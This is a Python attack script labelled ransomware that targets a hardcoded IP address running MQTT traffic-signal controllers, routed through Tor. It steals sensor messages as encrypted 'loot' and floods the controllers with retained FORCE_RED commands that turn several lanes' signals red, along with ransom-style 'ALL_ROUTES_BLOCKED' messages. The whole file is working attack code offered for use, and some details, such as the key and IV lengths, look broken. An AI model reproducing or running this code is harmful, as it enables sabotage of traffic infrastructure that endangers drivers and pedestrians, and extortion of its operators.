#!/usr/bin/env python3
# MIL_RANSOMWARE_v2.6 | MQTT 1.6.1 COMPATIBILE | NO CALLBACK ERRORS

import paho.mqtt.client as mqtt
import json, time, threading, base64, os, socket, random
import socks
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

class SWARCORansomware:
    def __init__(self):
        self.target_ip = "166.159.129.5"
        self.port = 1883
        self.btc_addr = "fucknomoneySUCCHIALO"
        
        # ✅ AES FIXED
        self.aes_key = b'TRUSTEDF57_SWARCO_MIL_K3Y_32BYT3S!!X'
        self.iv = b'SWARCO_SEMAFORI_16'
        
        # TOR
        socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
        socket.socket = socks.socksocket
        
        self.clients = []
        self.active = True
    
    def aes_encrypt(self, data):
        cipher = Cipher(algorithms.AES(self.aes_key), modes.CBC(self.iv), backend=default_backend())
        encryptor = cipher.encryptor()
        padded = data.encode('utf-8') + b' ' * (16 - len(data.encode('utf-8')) % 16)
        encrypted = encryptor.update(padded) + encryptor.finalize()
        return base64.b64encode(encrypted).decode()
    
    def force_red_payload(self):
        """🎯 JSON Swarco + FORCE_RED"""
        return '''{
  "timestamp": "%s",
  "TRUSTEDF57": "BLOCKED",
  "trigger_outputs": [
    {"traffic_triggers": [{"associated_lane": "lane1", "FORCE_RED": true, "TRUSTEDF57": true}], "trigger_output": 32},
    {"traffic_triggers": [{"associated_lane": "lane2", "FORCE_RED": true, "TRUSTEDF57": true}], "trigger_output": 33},
    {"traffic_triggers": [{"associated_lane": "lane3", "FORCE_RED": true, "TRUSTEDF57": true}], "trigger_output": 34},
    {"traffic_triggers": [{"associated_lane": "lane10", "FORCE_RED": true, "TRUSTEDF57": true}], "trigger_output": 40},
    {"traffic_triggers": [{"associated_lane": "lane15", "FORCE_RED": true, "TRUSTEDF57": true}], "trigger_output": 45},
    {"traffic_triggers": [{"associated_lane": "lane16", "FORCE_RED": true, "TRUSTEDF57": true}], "trigger_output": 46}
  ]
}''' % time.strftime("%Y-%m-%dT%H:%M:%S")
    
    def aes_domination(self):
        """💣 AES FLOOD"""
        aes_msg = self.aes_encrypt(f"TRUSTEDF57_{self.btc_addr}_ALL_ROUTES_BLOCKED")
        return aes_msg
    
    def on_connect(self, client, userdata, flags, rc):
        print(f"✅ CONNECTED rc={rc} ID={client._client_id}")
        client.subscribe("traffic-triggers-output")
        client.subscribe("traffic-statistic-output/+")
    
    def on_message(self, client, userdata, message):
        data = str(message.payload)
        print(f"[LOOT] {message.topic}: {data[:60]}...")
        
        # Salva loot
        loot = self.aes_encrypt(f"{message.topic}|{data}")
        try:
            with open("swarco_dom.aes", "a") as f:
                f.write(loot + "\n")
        except:
            pass
    
    def create_client(self):
        """✅ MQTT 1.6.1 PULITO"""
        client = mqtt.Client("TRUSTEDF57_" + str(random.randint(1000,9999)))
        client.on_connect = self.on_connect
        client.on_message = self.on_message
        
        # NO callback_api_version!
        try:
            client.connect(self.target_ip, self.port, 60)
            client.loop_start()
            print("✅ CLIENT CREATO")
            return client
        except Exception as e:
            print(f"❌ CLIENT ERROR: {e}")
            return None
    
    def spam_attack(self):
        """Spam continuo 10Hz"""
        payloads = [
            self.force_red_payload(),
            '{"☠️":"TRUSTEDF57_BLOCK","lanes":"ALL_RED"}',
            self.aes_domination(),
            '{"STATUS":"HALTED","BTC":"' + self.btc_addr + '"}'
        ]
        
        while self.active:
            for client in self.clients:
                if client:
                    topic = random.choice([
                        "traffic-triggers-output",
                        "traffic-statistic-output/sensor1",
                        "traffic-statistic-output/sensor2"
                    ])
                    payload = random.choice(payloads)
                    client.publish(topic, payload, qos=2, retain=True)
            
            time.sleep(0.1)  # 10Hz
    
    def run(self):
        print("🚀 TRUSTEDF57 v2.6 | MQTT 1.6.1 | NO ERRORS")
        
        # 8 client paralleli
        for i in range(8):
            client = self.create_client()
            if client:
                self.clients.append(client)
            time.sleep(1)
        
        print("💣 ATTACK START - 8 CLIENTS ACTIVE")
        
        # Spam infinito
        spam_thread = threading.Thread(target=self.spam_attack)
        spam_thread.daemon = True
        spam_thread.start()
        
        try:
            while True:
                time.sleep(5)
                print(f"📊 Active clients: {len([c for c in self.clients if c])} | Loot: {os.path.getsize('swarco_dom.aes')}")
        except KeyboardInterrupt:
            self.active = False
            print("🛑 STOPPED")

if __name__ == "__main__":
    os.system("rm -f swarco_dom.aes")
    rw = SWARCORansomware()
    rw.run()
